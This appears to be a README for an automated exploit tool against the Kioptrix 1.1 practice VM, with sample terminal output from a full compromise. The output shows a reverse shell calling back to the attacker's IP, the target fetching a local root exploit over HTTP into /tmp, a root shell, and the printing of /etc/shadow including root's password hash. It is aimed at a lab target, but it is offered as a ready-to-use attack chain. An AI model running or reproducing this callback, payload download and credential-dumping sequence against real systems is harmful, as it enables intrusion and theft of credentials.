## Kioptrix 1.1 Automagic Exploitation Tool.
Just supply your target IP and your callback IP. The automation will handle the rest. It even downloads/executes the local root exploit for you and just pops you open a shell.

You will need `pwntools` and `requests`.

```
(venv) sky@kitten:~/projects/kioptrix/1.1$ python kioptrix1.1.py 192.168.0.103 192.168.0.101
kioptrix level 1.1 automatic exploitation utility.
[+] Trying to bind to 0.0.0.0 on port 0: Done
[+] Waiting for connections on 0.0.0.0:36431: Got connection from 192.168.0.103 on port 32784
[*] Switching to interactive mode
Started httpserver on port  bash: no job control in this shell
bash-3.00$ 8976
--12:58:44--  http://192.168.0.101:8976/1.1.c
           => `/tmp/rootme.c'
Connecting to 192.168.0.101:8976... {+} Got call from 192.168.0.103 - dropping local root ;)connected.
HTTP request sent, awaiting response... 
192.168.0.103 - - [11/Sep/2017 13:58:45] "GET /1.1.c HTTP/1.0" 200 -
200 OK
Length: unspecified [text/plain]

    0K ...                                                     223.58 MB/s

12:58:44 (223.58 MB/s) - `/tmp/rootme.c' saved [3751]

bash-3.00$ sh: no job control in this shell
sh-3.00# $ id;uname -a;pwd
uid=0(root) gid=0(root) groups=48(apache)
Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux
/var/www/html
sh-3.00# $ head -n 3 /etc/shadow
root:$1$FTpMLT88$VdzDQTTcksukSKMLRSVlc.:14529:0:99999:7:::
bin:*:14525:0:99999:7:::
daemon:*:14525:0:99999:7:::
sh-3.00# $ 
```
